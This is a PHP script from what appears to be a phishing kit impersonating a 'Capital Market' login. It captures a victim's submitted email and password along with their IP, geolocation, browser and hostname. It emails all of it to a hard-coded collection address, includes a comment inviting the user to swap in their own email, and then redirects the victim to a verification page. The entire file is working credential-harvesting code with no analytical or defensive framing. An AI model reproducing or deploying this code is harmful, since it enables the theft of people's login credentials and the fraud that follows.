<?
$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.

$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$timedate = date("D/M/d, Y g:i a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message .= "$-@-!$-@-!$-@-!$-@-!-------Capital Market----$-@-!$-@-!$-@\n";
$message .= "Username            : ".$_POST['email']."\n";
$message .= "Password            : ".$_POST['formtext2']."\n";
$message .= "-@-!$-@-!$-@-!-----Capital Market---------$-@-!$-@-!$-@\n";
$message .= "IP                     : ".$ip."\n";
$message .= "Browser                :".$browserAgent."\n";
$message .= "DateTime                    : ".$timedate."\n";
$message .= "country                    : ".$country."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "-@-!$-@-!$-@-!----Created By L!F3xL!F3L!F3---$-@-!$-@-!$-@-\n";
//change ur email here
$send = "rtamez@masterrfuel.com";
$subject = "Resort intel $ip";
$headers = "From: Uknown<customer-support@Timmer>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}

	
		   header("Location: verification.php");

	 
?>